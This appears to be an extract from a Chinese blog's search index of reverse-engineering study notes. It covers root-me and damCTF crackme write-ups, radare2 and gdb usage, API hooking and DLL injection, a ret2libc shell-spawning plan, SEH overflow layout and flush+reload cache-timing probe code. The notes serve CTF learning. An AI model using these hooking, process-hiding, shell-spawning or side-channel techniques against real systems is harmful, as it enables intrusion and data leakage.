files start with 7f 45 4c 46","text":"ELF — Random Crackme将magic之前的内容都删除，因为之前的垃圾内容，使得不能运行ELF文件ELF files start with 7f 45 4c 46 r2 -ww ./ch3.bin-w open file in write modeww foobar write wide string ‘f\\x00o\\x00o\\x00b\\x00a\\x00r\\x00’ wx 9090 write two intel nops [0x080482f0]&gt; wx eb @ 0x0804841A Short Jump（短跳转）机器码 EB 用time,rand产生随机密码gdb 直接设置eip 跳过代码 set $eip=xxxx 再运行c binwalk crackme_wtf 1234r2aaaafl //list functions sym.main ELF x64 - Crackme automatingstr=”break\\n”var4=0var8=0xf7(MOVSXD r64, r/m32 Move doubleword to quadword with sign-extension.这是64位代码中的指令，它将32位寄存器或地址转换为32位值，并将其符号扩展为64位寄存器。 符号扩展采用源的最高位（符号位）的值，并使用它来填充目标的所有高位。) var4+str位置加var4(movzx是将源操作数的内容拷贝到目的操作数，并将该值用0扩展至16位或者32位。但是它只适用于无符号整数。 他大致下面的三种格式。) str[0]MOVSX 指令（进行符号扩展并传送）将源操作数内容复制到目的操作数，并把目的操作数符号扩展到 16 位或 32 位。这条指令只用于有符号整数， xor (str[0] ,0xa3)=0xf7 str[1] cmp eax, 0xf7 注：上篇有自动化代码链接","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"root_me_PE_x86_SEHVEH_WP","slug":"root_me_PE_x86_SEHVEH_WP","date":"2020-10-13T11:02:38.000Z","updated":"2020-10-13T11:03:41.587Z","comments":true,"path":"2020/10/13/root_me_PE_x86_SEHVEH_WP/","link":"","permalink":"http://finsenty54.github.io/2020/10/13/root_me_PE_x86_SEHVEH_WP/","excerpt":"PE DotNet - 0 protection使用 NET relector工具或者dnSPYhttps://github.com/0xd4d/dnSpy/releases就可以破解","text":"PE DotNet - 0 protection使用 NET relector工具或者dnSPYhttps://github.com/0xd4d/dnSpy/releases就可以破解 ELF x64 - Crackme automatingpython 编程 别人写的代码https://mydiary42.wordpress.com/2019/01/26/root-me-crackme-automating/ int([x]) -&gt; integerint(x, base=10) -&gt; integer将数字或字符转为整形Convert a number or string to an integer, or return 0 if no arguments are given. num=line[addr+1,-1] byte.append(int (num,16)) //将num变为16进制 使用pwntools / Capstone /objdump 获得反汇编代码之后进行搜索 PE x86 - SEHVEH_WP从题目知道是关于SEH 和 VEH（VectoredExceptionHandler）的。 OllyDBG 查看seh链 选择 view-seh chain 在输入后进入主要部分。这段不是很懂，根据多次调试后判断，如果输入12个字节，则0xB814A8处就可以跳转，使EBP为0.为0，即表示密码正确，会输入成功语句。 接下来是第一部分密码LODS即将密码头四个字节放入EAX中，将0x5A643059 xor 0x 3628552E得到第一部分密码，还需反序排列为weLl FS：[0] 为TEB结构体中指向第一个SEH结构体地址即0xEFFC14.接着，执行INT 1指令后，会进入0xDB1D60处的第一个SEH函数。SEH函数的第三个参数，即[ESP+C]为pContext的地址，pContext保存线程切换时的寄存器信息。在PE 32位下，+0xB0为EAX寄存器的值，0xB81D64处将0x48335621加到EAX+0xB0中，保存着输入的第二部分四字节密码。+0xB8为EIP寄存器的值，通过下面的判断将EIP值加2，结果为0xB814E4，即INT 1指令的下一条指令地址。XOR EAX,EAX将EAX置0，表示从发生异常的代码处继续执行。最后计算如下：FF2C F8E5 XOR 495F 4265 = B673 BA80 - 48335621 = 6E40 645F=n@d_反序排列为_d@n 0xB814FF处调用AddVectoredExceptionHandler函数，新增一个SEH函数。以下摘自https://docs.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler 1234PVOID AddVectoredExceptionHandler( ULONG First, PVECTORED_EXCEPTION_HANDLER Handler); FirstThe order in which the handler should be called. If the parameter is nonzero, the handler is the first handler to be called. If the parameter is zero, the handler is the last handler to be called.如果不为0，则成为第一个调用的SEH函数，从图中可以看到，First=1.HandlerA pointer to the handler to be called. For more information, see VectoredHandler.从图中看出，函数地址为0xB81940，Return valueIf the function succeeds, the return value is a handle to the exception handler.If the function fails, the return value is NULL.该函数将第三部分的四字节密码减去了一个数，之后，又执行第二个SEH函数。有个疑问是这里将返回值置0，又怎么执行第二个SEH函数。最后计算如下：3C4C7440 xor 74406653 =480C 1213 + 21486553 - 48335621=21212145=!!!E反序排列为E!!! 最后三部分密码组合在一起：weLl_d@nE!!!密码正确","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"damCTF- rev/schlage (beginner) __WP","slug":"schlage (beginner) __WP","date":"2020-10-12T08:02:16.000Z","updated":"2020-10-12T08:08:47.094Z","comments":true,"path":"2020/10/12/schlage (beginner) __WP/","link":"","permalink":"http://finsenty54.github.io/2020/10/12/schlage (beginner) __WP/","excerpt":"damCTF- rev/schlage (beginner) __WP 先用file命令查看可以看到是64位的ELF文件,debug信息还在 接着使用radare2反汇编 使用VV命令进入视图模式","text":"damCTF- rev/schlage (beginner) __WP 先用file命令查看可以看到是64位的ELF文件,debug信息还在 接着使用radare2反汇编 使用VV命令进入视图模式 我们的任务是解锁，这里又5把锁 关键的代码是这5个函数 Pin1第三把锁比较简单，来看第一把锁 也可以在视图模式按o再输入函数旁边的字母 这是一个循环操作，共五次，每一次将两个数字异或，最后和0xee比较，相同则成功rbp+rax-0x0e即指向开头移入地址的5个数 0x3e xor 0x57 xor 0x81 xor 0xd3 xor 0x 25 xor 0x 93 xor 0xee 结果为0x99 jle：JNB al, bl ；al里的内容不等于bl时跳转JBE al, bl ；al里的内容小于或等于bl时跳转 ；同理，JGB是大于或等于，JLE是小于或等于；A（above）大于，B（below）小于，E（equal）等于，用于比较无符号数；G（great）大于，L（less than）小于， E（equal）等于，用于比较带符号数 pin5 srand()第5把锁用到了srand()和rand()两个函数。 根据种子产生随机数1) 给srand()提供一个种子，它是一个unsigned int类型；2) 调用rand()，它会根据提供给srand()的种子值返回一个随机数(在0到RAND_MAX之间)； 也就是，一个种子，它所产生的随机数是固定的。123unsigned int a=1111638594； //0x42424242srand(a); cout&lt;&lt;rand()&lt;&lt;endl; 输入rand()生成的随机数即可，即为1413036362 lealea是“load effective address”的缩写，简单的说，lea指令可以用来将一个内存地址直接赋给目的操作数，例如：lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax，而不是把ebx+8处的内存地址里的数据赋给eax。而mov指令则恰恰相反，例如：mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。 pin2查看汇编代码可以知道，pin2根据实际输出了一个种子，根据种子调用rand()即可。 这个种子下一把锁还要用到，再一次调用rand()，获得的是第二个随机数。 pin4我认为这是最难得了，主要是编程。直接看r2 太复杂，所以我用IDA PRO，然后F5反编译。1234567891011121314151617puts(\"What's your favorite sentence?\"); fgets(s, 32, stdin); s[strcspn(s, \"\\n\")] = 0; //换行符变为0x00 v3 = rand() % 10 + 65; v1 = 0; v4 = strlen(s); // strlen 遇到/0结束 for ( i = 0; i &lt; v4; ++i ) v1 += v3 ^ s[i]; //将随机值与字符异或，结果相加要为291 if ( v1 == 291 ) &#123; puts(\"Such a cool sentence!\"); byte_20203C = 1; &#125; else &#123; puts(\"Not a big fan of that sentence\"); &#125; 注释已经写在代码中，接下来，就是编程破解得到符合的字符串。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;string&gt;using namespace std; int main()&#123; /*FILE *pe=NULL; char s[1]=&#123;'1'&#125;; pe=popen(\"nc chals.damctf.xyz 31932\",\"rw\"); if(pe==NULL) cout&lt;&lt;\"connect failed\"&lt;&lt;endl; while (1) &#123; fwrite(s,sizeof(s),1,pe); fgets(s,20,pe); cout&lt;&lt;s; break; &#125; pclose(pe);*/ unsigned int a=1602480388;//1111638594 srand(a); cout&lt;&lt;rand()&lt;&lt;endl; int v3 = rand() % 10 + 65; cout&lt;&lt;\"v3=\"&lt;&lt;v3&lt;&lt;endl; //=74 int remain=291; //291下搜索 int qu=0; int resu; for (int i=0;i&lt;32;i++)&#123; //最大允许输入31个字符 for(int j=0;j&lt;58;j++)&#123; //从A开始搜索 resu=v3^int('A'+j); if(resu==0) //==0没有用 &#123;continue;&#125; else if ( resu&lt;remain || remain%resu==0)&#123; //实际上感觉不用加后面的条件 qu+=remain/resu; //累计得到的字符数 if(qu&gt;31)&#123; //不能大于31 qu-=remain/resu; continue; &#125; for(int k=0;k&lt;remain/resu;k++) //输出成功的字符 cout&lt;&lt;char('A'+j); cout&lt;&lt;endl; remain=remain%resu; //更新余下值 cout&lt;&lt;\"i= \"&lt;&lt;i&lt;&lt;\" \"&lt;&lt;\"resu=\"&lt;&lt;resu&lt;&lt;\"qu= \"&lt;&lt;qu&lt;&lt;\"remain=\"&lt;&lt;remain&lt;&lt;endl; i=qu-1; //更新i cout&lt;&lt;\"after i= \"&lt;&lt;i&lt;&lt;endl; break; &#125; &#125; if (remain==0) //填满291 成功 &#123; cout&lt;&lt;\"find\"&lt;&lt;\"i=\"&lt;&lt;i&lt;&lt;endl; break; &#125; else if(i&gt;=31) //最后都没有搜索到，失败 &#123; cout&lt;&lt;endl&lt;&lt;\"don't find\"&lt;&lt;endl; cout&lt;&lt;\"remainder= \"&lt;&lt;remain&lt;&lt;endl; break; &#125; &#125; return 0;&#125; 输入字符，成功解锁。 最后flag文件在远程服务器，但链接时间很短，可能需要脚本自动化发送，有点小难😢 fgets()C 库函数 char fgets(char str, int n, FILE *stream) 从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内。当读取 (n-1) 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。 strlen()C 库函数 size_t strlen(const char *str) 计算字符串 str 的长度，直到空结束字符，但不包括空结束字符。 结束语不愧是新手题，只是最后编程花了我不少时间。","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"逆向_root_me_3","slug":"逆向_root_me_3","date":"2020-10-08T12:21:43.000Z","updated":"2020-10-08T12:22:25.176Z","comments":true,"path":"2020/10/08/逆向_root_me_3/","link":"","permalink":"http://finsenty54.github.io/2020/10/08/逆向_root_me_3/","excerpt":"ELF x86 - No software breakpoints看反汇编，大致了解过程这是众所周知的反调试技术，它不能在应用程序本身中放置任何软件断点。因为当我们在用户模式应用程序中遇到断点时，代码中将放入0xCC（int3），因此计算将是错误的，并将生成错误的校验和.","text":"ELF x86 - No software breakpoints看反汇编，大致了解过程这是众所周知的反调试技术，它不能在应用程序本身中放置任何软件断点。因为当我们在用户模式应用程序中遇到断点时，代码中将放入0xCC（int3），因此计算将是错误的，并将生成错误的校验和.这是在ecx中计算一种散列值，它基于入口点的整个代码。如果我们对函数进行任何更改，值将不再相同，从而阻止我们编辑二进制文件. 计算整个text 指令的和，所以放入0xCC会 报错，也就是改变的指令。 移位运算符a&lt;&lt;3a的内容不改变 edx &amp; 0xff取最后8位 g++g++主要用来编译c++文件，g++编译c++文件是会连接libc++。 gcc主要用来编译c文件，也可编译c++，但gcc编译c++文件默认不连接libc++。 移位移位时，移出的位数全部丢弃，移出的空位补入的数与左移还是右移有关。如果是左移，则规定补入的数全部是0；如果是右移，还与被移位的数据是否带符号有关。若是不带符号数，则补入的数全部为0；若是带符号数，则补入的数全部等于原数的最左端位上的原数(即原符号位) 命名空间引入了命名空间这个概念，它可作为附加信息来区分不同库中相同名称的函数、类、变量等。使用了命名空间即定义了上下文。本质上，命名空间就是定义了一个范围。 可以使用 using namespace 指令，这样在使用命名空间时就可以不用在前面加上命名空间的名称。这个指令会告诉编译器，后续的代码将使用指定的命名空间中的名称。 ELF x86 - CrackPassgdb-peda$ help xExamine memory: x/FMT ADDRESS. gdb-peda$ print/t $ebx二进制打印寄存器 set $ZF = 6 set $eflags |= (1 &lt;&lt; $ZF) 设定ZF值为1 show where显示当前位置 MOVZX 指令（进行全零扩展并传送）将源操作数复制到目的操作数，并把目的操作数 扩展到 16 位或 32 位。 r2 图形模式下，如何跳转和返回函数图形模式下，按o进行跳转按u返回上一个函数 ff07031d6fb052490149f44b1d5e94f1592b6bac93c06ca9 25260060504_VE_T25_t_ Usage: jump LOCATIONGive as argument either LINENUM or *ADDR, where ADDR is an express","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"逆向_root_me_2","slug":"逆向_root_me_2","date":"2020-10-07T06:27:22.000Z","updated":"2020-10-07T06:29:06.581Z","comments":true,"path":"2020/10/07/逆向_root_me_2/","link":"","permalink":"http://finsenty54.github.io/2020/10/07/逆向_root_me_2/","excerpt":"逆向 root_mePE .NEThttps://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection","text":"逆向 root_mePE .NEThttps://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection MIPS. ELF MIPS - Basic Crackmehttps://www.root-me.org/en/Challenges/Cracking/ELF-MIPS-Basic-Crackme 在MIPS架构中，“ $ ra”寄存器保存返回地址，类似于x86指令指针“ EIP” ELF fake instrucationshttps://www.root-me.org/en/Challenges/Cracking/ELF-x86-No-software-breakpoints dis main gdb-peda$ set disassembly-flavor intel //汇编用intel语言显示 gdb-peda$ i r $edx //显示edx值 ni //ni/si都是汇编级别的断点定位。si会进入汇编和C函数内部,ni不会 //这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码 jz 表示当zf =1时跳转，即结果为0跳转。jnz 即 zf=0时跳转，即结果不为0 跳转。 gdb-peda$ i r //全显示 gdb-peda$ set $eax=0 gdb-peda$ x/s $eax //查看寄存器指向的内容 call WPA(&quot;toto&quot;, &quot;toto&quot;) //直接在gdb中运行命令？？ ELF ptracehttps://www.root-me.org/en/Challenges/Cracking/ELF-x86-Ptrace Load the application into IDA pro,search main function,press F5to disassemble it,get the code below:IDA 按F5 反编译 生成伪代码 r2 -ww ./ch3.bin -w open file in write mode ww foobar write wide string &apos;f\\x00o\\x00o\\x00b\\x00a\\x00r\\x00&apos; wx 9090 write two intel nops [0x080482f0]&gt; wx eb @ 0x0804841AShort Jump（短跳转）机器码 EB pd N disassemble N instructions gdb-peda$ i b set $al=$dl","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"逆向工程核心原理_little_summary","slug":"逆向工程核心原理_little_summary","date":"2020-10-06T06:18:05.000Z","updated":"2020-10-06T06:19:13.677Z","comments":true,"path":"2020/10/06/逆向工程核心原理_little_summary/","link":"","permalink":"http://finsenty54.github.io/2020/10/06/逆向工程核心原理_little_summary/","excerpt":"INT 和 IATINT 是rva数组，INT表示数组首地址 数组元素是一个地址 指向由一个2字节ordinall地址和函数名称组成的结构体 第一个值地址指向第一个结构体 如果IAT存在于 选择头中IAT表明的地址中 相应没有写权限也没事 INT和IAT指向内容有时相同 表示地址肯定不同 因为保存在不同地址 所指内容相同","text":"INT 和 IATINT 是rva数组，INT表示数组首地址 数组元素是一个地址 指向由一个2字节ordinall地址和函数名称组成的结构体 第一个值地址指向第一个结构体 如果IAT存在于 选择头中IAT表明的地址中 相应没有写权限也没事 INT和IAT指向内容有时相同 表示地址肯定不同 因为保存在不同地址 所指内容相同 进程内存转储OLLYGDB插件？？ dump命令是解压缩运行时，将内存转为文件，方便查看 代码注入使用CALL指令将接下来的在代码间的字符串数据地址压入栈，然后直接接下来运行命令 CALL EAXEAX保存函数地址32位保存返回内容 top 命令 (linux)查看 CPU 时间在 User space 与 Kernel Space 之间的分配情况 SEH链ollydbg VIEW-SEH CHAIN API钩取windows 中内核模式所有代码共用一个虚拟空间地址，用API传e1 = 9Fh =&gt; 0fh*2^7 = 780h 使用常规系统资源的API会经由kernel32.dll和ntdll.dll不断向下调用，最后经由SYSENTER命令进入内核模式 动态方法常用 调试和注入方法1：调试异常必须处理为EXCEPTION_BREAKPOINT 汇编指令为int 3 IA-32指令为0xCC 用异常获取API的控制 线程上下文，（执行完一个线程时间片，执行另一个），也就是各个寄存器信息，保存在CONTEXT结构体中。 CONTEXT.esp api钩取 获取某个API的控制权 方法2：DLL注入setwindowstextA 表示ASCIIsetwindowstextW 表示宽字符 win中为Unicode码 IAT钩取通过注入DLL，修改IAT中指向某API的地址改为指向自己API的地址，自己的函数再去调用某API，来达到修改的目的 搜索API在用ollydng进行内部模块call 搜索时，先选取对的模块。右键-select moudle在用ollydbg 中search for name命令 API代码修改将API头五个字节 修改 为JMP XXXXXXXX即跳转到注入的函数中 通过将ntdll.ZwQuerySystemInformation() 函数形成的链表中删除进程信息即可做到隐藏相关进程。 全局API钩取通过修改ntdll.ZwResumeThread() API 热补丁 hot patch修改7字节代码1.二次跳转两字节跳到指令上面，用五字节跳到自己的函数地址2.不用脱钩，地址+2字节，就可正常运行 ia-32 E9 表示far jmp 五字节。E9 XXXXXXXX=要跳转的地址-当前指令地址-当前指令长度（5） EB 表示 short jmp 两字节依托当前EIP 在-128~127范围间跳转XX=要跳转的地址-当前指令地址-当前指令长度（2）","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"ch25.bin","slug":"ch25bin","date":"2020-10-05T11:13:34.000Z","updated":"2020-10-05T11:14:23.029Z","comments":true,"path":"2020/10/05/ch25bin/","link":"","permalink":"http://finsenty54.github.io/2020/10/05/ch25bin/","excerpt":"逆向 root_mech25.binhttps://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en","text":"逆向 root_mech25.binhttps://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en 识别C++类如何识别软件是用C++所写？1 频繁使用ECX 保存this 指针 ，指向类对象，如在调用函数前2 虚函数 要先知道类虚函数表，然后得到实际值，也是传到ECX中3 使用STL code 可用IDA imports查看 类怎么在内存中存储每个变量四字节不足要对齐内存中排列与定义相同 虚函数表要在最开头表包含虚函数地址，按定义排序 如果继承另一个类 继承多个类虚表按顺序排序 识别类1 识别构建和撤销1.1 全局变量在编译时 保存到（PE）文件的数据段构建在main()前调用 用this调用全局变量，在EP和main()间，确定为构建1.2局部变量指针指向未初始化的栈变量 1.3动态分配变量 new(）堆上分配 2多态类识别2.1鉴别多态通过RTTI，其可以让对象在运行时确定类型。RTTICompleteObjectLocator pointer TypeDescriptor指向的结构包含类名 RTTIClassHierarchyDescriptor RTTIBaseClassDescriptor vftablevbtable (virtual base class table) 指令E9指令E9相对寻址e9 xxxxxxxxxxxxxxxx=要跳转的地址-当前指令地址-当前指令长度（5）e9 00 00 00 00 即跳转到下一个地址402005-402000-5=000000 指令EBEB表示short jmp命令，进行短距离跳转eb xx 指令setneset if not equalsetne clif ZF=1 then cl=0if ZF=0 then cl=1 strings 命令display printable strings in [file(s)] (stdin by default) 破解方法11234567891011121314$ gdb ./ch25.bin (gdb) set args toto //设置输入参数toto(gdb) b main //在main设置断点Breakpoint 1 at 0x8048a95 (gdb) r //运行程序（到断点）Breakpoint 1, 0x08048a95 in main ()(gdb)disass //显示汇编代码(gdb) b *main+268gdb)c 继续执行(gdb) layout prev 可以查看堆栈和汇编代码(gdb) x/1xw $eax“ x / 1xw $ eax命令在EAX寄存器中包含的地址处显示1个十六进制格式的16位字(gdb) x/1s 0X08050b24查看该地址值 破解方法2radare2 类似IDA1234r2 ch25.binaaa //分析函数，参数...VV @main //使用 VV 进入 图形化模式（需要是函数范围内）。pdf @ main //分析后就可以正常打印函数代码了（pdf 打印函数代码） peda是GDB的一个插件https://github.com/longld/peda gdb-peda$ run jlkd 带参数运行","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"逆向 学习r2 part2","slug":"逆向学习r2part2","date":"2020-09-27T11:19:49.000Z","updated":"2020-09-27T11:20:33.245Z","comments":true,"path":"2020/09/27/逆向学习r2part2/","link":"","permalink":"http://finsenty54.github.io/2020/09/27/逆向学习r2part2/","excerpt":"逆向 学习r2 part2https://www.megabeets.net/a-journey-into-radare-2-part-2/ 在NX和ASLR的保护下","text":"逆向 学习r2 part2https://www.megabeets.net/a-journey-into-radare-2-part-2/ 在NX和ASLR的保护下 $ r2 -d megabeets_0x2-d – Open in the debug modeaas – Analyze functions, symbols and more dcu address Continue until address VV pdf @ sym.beet ragg2ragg2, which allows us to generate a cyclic pattern called De Bruijn Sequence and check the exact offset where our payload overrides the buffer.它允许我们生成一个称为De Bruijn Sequence的循环模式，并检查有效载荷覆盖缓冲区的确切偏移量 -P [size] prepend debruijn pattern -q [fragment] debruijn pattern offset -r show raw bytes instead of hexpairs $ ragg2 -P 100 -r之前SEH攻击 应该有用过 rarun2rarun2用作启动器，用于运行具有不同环境，参数，权限，目录的程序，并覆盖默认文件描述符（例如stdin）。当您必须使用长参数运行程序，将大量数据传递给stdin或类似的东西时，这很有用，这通常是利用二进制文件的情况。 $ ragg2 -P 200 -r &gt; pattern.txt $ cat pattern.txt $ vim profile.rr2 $ cat profile.rr2 #!/usr/bin/rarun2 stdin=./pattern.txt $ r2 -r profile.rr2 -d megabeets_0x2-r [rarun2] specify rarun2 profile to load (same as -e dbg.profile=X)-d debug the executable ‘file’ or running process ‘pid’ 信号是发送到同一进程中的某个进程或特定线程的异步通知，以便将发生的事件通知给它。·当SIGSEGV（11）信号做出无效的虚拟内存引用或分段错误时，即在执行分段违规时，将其发送到进程。 wopO value Finds the given value into a De Bruijn Pattern at current offset | dr Show ‘gpr’ registerswopO dr eip没有成功wopO 0x41417641 i Get info from opened file (see rabin2’s manpage)ii Importsiip 更简明 The plan Leak the real address of puts Calculate the base address of libc Calculate the address of system Find an address in libc that contains the string /bin/sh Call system with /bin/sh and spawn a shell 过程链接表Procedure Linkage Table（PLT)是一个内存结构，其中包含外部功能的代码存根，这些函数的地址在链接时是未知的。·每当我们在.text段中看到对函数的CALL指令时，都不会直接调用该函数。·相反，它在PLT处调用存根代码，例如func_name @ plt。然后，存根跳转到全局偏移表（GOT）中为此功能列出的地址。如果它是此功能的第一个CALL，则GOT条目将指向PLT，后者将调用动态链接器，该链接器将解析所需功能的实际地址下次调用func_name @ plt时，存根直接从GOT获取功能地址。((少了动态链接步骤？？)) pwntools漏洞利用框架 ~ character is radare’s internal grep [0xf7763b30]&gt; # the address of puts@plt: [0xf7763b30]&gt; ?v sym.imp.puts //Usage: ?v[id][ num] # Show value 0x08048390 [0xf7763b30]&gt; ?v reloc.puts sy按tab键自动搜寻 Usage: dmi # List/Load Symbols All these paddr=0x000xxxxx are the offsets of the function from libc base. 为此，我们将使用radare的搜索功能。·默认情况下，radare正在dbg.map中搜索，这是当前的内存映射。·我们要搜索所有内存映射，因此我们需要对其进行配置：[0x080483d0]&gt; e search.in = dbg.maps要以可视方式配置雷达，请使用Ve Usage: /[!bf] [arg] Search stuff dmm List modules of target process [0x080483d0]&gt; ?X 0xf7700768-0xf7599000","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"学习r2","slug":"学习r2","date":"2020-09-24T08:29:04.000Z","updated":"2020-09-24T08:30:03.440Z","comments":true,"path":"2020/09/24/学习r2/","link":"","permalink":"http://finsenty54.github.io/2020/09/24/学习r2/","excerpt":"逆向 学习r2RABIN2 — Binary program info extractor$ rabin2 -I megabeets_0x1 stripped false没有剥离符号表static false //所以是动态链接","text":"逆向 学习r2RABIN2 — Binary program info extractor$ rabin2 -I megabeets_0x1 stripped false没有剥离符号表static false //所以是动态链接 r2 //radare2ie[0x08048370]&gt; ie ie 命令可以打印出程序的入口点 ?在任何一个命令后面添加 ? 来获得更多的子命令信息： [0x08048370]&gt; i? aa使用 ‘aa’ 命令来分析文件 [0x08048370]&gt; a? aa?aaa[?] autoname functions after aa (see afna) flagflag 是所有类似特征的集合，展示所有的 flag ，用 ‘fs’ 命令 [0x08048370]&gt; fs f f list flags (will only list flags from selected flagspaces [0x08048370]&gt; fs imports; f iziz – 列出数据段里的字符串 axt[0x08048370]&gt; axt @@ str.* axt [addr] find data/code references to this address @@ # foreach iterator command: x| x @@ sym.* run ‘x’ over all flags matching ‘sym.’ in current flagspace ss # Help for the seek commands. See ?$? to see all variables aflaf?用 ‘afl’ 指令，这个指令代表着分析函数列表（Analyze Functions List）. pdfs main用 ‘pdf’（输出反汇编代码） mm 可以用来标记特定的偏移地址，之后输入对应的key就可以跳转到你设置的地方. VV 视图模式shell 里输入 VV来进入图形模式 f sym. 来定位出 sym.beet 函数pdf @ sym.beet 命令，‘@’ 表示临时查找可视视图界面直接跳转到 beet 函数上面说过的方框中的数字吗？这里直接按 3 就可以了 gd 命令，d 就是每一个跳转或者调用代码旁边的 字母 ahi:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7ahi s set base to string (1)ahi s 是用来设置字符串特定的偏移地址@@是一个迭代器，可以用来接受后面输入的多个参数,执行完这条命令后 rr 图形模式刷新 rahash2rahash2 包含很多种算法来求证一个文件或者字符串的校验值,具体的用法请使用 ‘man rahash2 ‘. 00oo reopen current fileood [args] # reopen in debug mode (with args) dcdc Execution continuation commands| dc Continue execution of all children","categories":[],"tags":[{"name":"RCE","slug":"RCE","permalink":"http://finsenty54.github.io/tags/RCE/"}]},{"title":"ARM内联汇编","slug":"ARM内联汇编","date":"2020-09-24T00:34:38.000Z","updated":"2020-09-24T00:41:34.491Z","comments":true,"path":"2020/09/24/ARM内联汇编/","link":"","permalink":"http://finsenty54.github.io/2020/09/24/ARM内联汇编/","excerpt":"gcc ARM内联汇编 与 预处理预处理define 编译预处理时，对程序中所有出现的“宏名”，都用宏定义中的字符串去代换 #开头都是预编译指令","text":"gcc ARM内联汇编 与 预处理预处理define 编译预处理时，对程序中所有出现的“宏名”，都用宏定义中的字符串去代换 #开头都是预编译指令 #ifndef HEADER_FILE #define HEADER_FILE the entire header file file #endif 这种结构就是通常所说的包装器 #ifndef。当再次引用头文件时，条件为假，因为 HEADER_FILE 已定义。此时，预处理器会跳过文件的整个内容，编译器会忽略它。 您可以使用 typedef 为一个已有的类型取一个新的名字。下面是使用 typedef 定义一个新类型的语法： typedef struct config *config_t; //将config* 重新定为 config_t typedef type newname; ARM内联汇编GCC编译器支持直接在C或者C++代码中，嵌入ARM汇编代码。其基本格式非常简单，大致如下： __asm__ [__volatile__] ( assembler template : [output operand list] /* optional */ : [input operand list] /* optional */ : [clobbered register list] /* optional */ ); 每一个操作数由下列组成 [name]&quot;[modifier]constraint&quot;(C expression) name 表示别名 限定符constraint &quot;a”将输入变量放入eax &quot;b”将输入变量放入ebx “c”将输入变量放入ecx “d”将输入变量放入edx “s”将输入变量放入esi “d”将输入变量放入edi GCC中定义了三个修改符modifier，分别是：修改符 含义 = 只写操作数，通常用于输出操作数中 + 可读且可写操作数，必须要列在输出操作数中 &amp; 寄存器只能用于输出 编译器并不会分析你的汇编代码，找出这种被你修改过，需要恢复的寄存器，因此你必须显式的告诉编译器，被你修改过的寄存器有哪些。这就是修改寄存器列表所起到的作用。clobbered register list 示例__flush and reload/*SFENCE——串行化发生在SFENCE指令之前的写操作但是不影响读操作。 LFENCE——串行化发生在SFENCE指令之前的读操作但是不影响写操作。 MFENCE——串行化发生在MFENCE指令之前的读写操作。 sfence:在sfence指令前的写操作当必须在sfence指令后的写操作前完成。 lfence：在lfence指令前的读操作当必须在lfence指令后的读操作前完成。 no instruction fol-lowing it executes before thelfenceinstruction mfence：在mfence指令前的读写操作当必须在mfence指令后的读写操作前完成。 */ 123456789101112131415161718192021222324252627unsigned long gettime() &#123; volatile unsigned long tl; asm __volatile__(\"lfence\\nrdtsc\" : \"=a\" (tl): : \"%edx\"); //“__volatile__”关键字，这个是可选的， //其作用是禁止编译器对后面编写的汇编指令再进行优化 return tl;&#125;int probe(char *adrs) &#123; volatile unsigned long time; //gcc arm asm __volatile__ ( \" mfence \\n\" //cpuid (intel) 虚拟机会模拟该指令，导致时间增加 \" lfence \\n\" \" rdtsc \\n\" \" lfence \\n\" //reads the 64-bitcounter, returning the low 32 bits of the counter in%eax and the high 32 bits in%edx \" movl %%eax, %%esi \\n\" //把rdtsc返回的时间传入ESI保存 \" movl (%1), %%eax \\n\" //%1表示adrs reads 4 bytes from the memory address in%ecx \" lfence \\n\" //（）表示指针 \" rdtsc \\n\" \" subl %%esi, %%eax \\n\" //rdtsc返回值保存在eax.相减，结果保存在eax \" clflush 0(%1) \\n\" //()剔除缓存中的值 : \"=a\" (time) : \"c\" (adrs) //c infer edc : \"%esi\", \"%edx\"); return time; /*Loads shorter than the threshold are presumed tobe served from the cache, indicating that another processhas accessed the memory line since it was last flushed5 from the cache*/&#125;","categories":[],"tags":[{"name":"C++","slug":"C","permalink":"http://finsenty54.github.io/tags/C/"}]},{"title":"SEH","slug":"SEH","date":"2020-09-21T14:25:04.000Z","updated":"2020-09-21T14:25:59.079Z","comments":true,"path":"2020/09/21/SEH/","link":"","permalink":"http://finsenty54.github.io/2020/09/21/SEH/","excerpt":"PWN学习Exploit writing tutorial part 3 : SEH Based Exploits","text":"PWN学习Exploit writing tutorial part 3 : SEH Based Exploits 1st exception occurs : | ————————— (1) | ——-+————– (3) opcode in next SEH : jump over SE Handler to the shellcode | | | | V V[ Junk buffer ][ next SEH ][ SE Handler ][ Shellcode ] opcode to do (3) Shellcode gets executed jump over pop pop ret SE Handler | ^ | | | ————– (2) will ‘pretend’ there’s a second exception, puts address of next SEH location in EIP, so opcode gets executed 当一个异常触发时，会建立自己的栈，push EH Handler的参数，在ESP+8处的EstablisherFrame指向下一个SEH，在这里写pop pop ret的地址 the first pop will take off4 bytes from the stackthe second pop will take another4 bytesfrom the stackthe ret will take thecurrent valuefrom the top of ESP ( = the address of the next SEH, which was atESP+8, but because of the 2 pop’s now sits at the top of the stack) and puts that in EIP. SEH链ollydbg VIEW-SEH 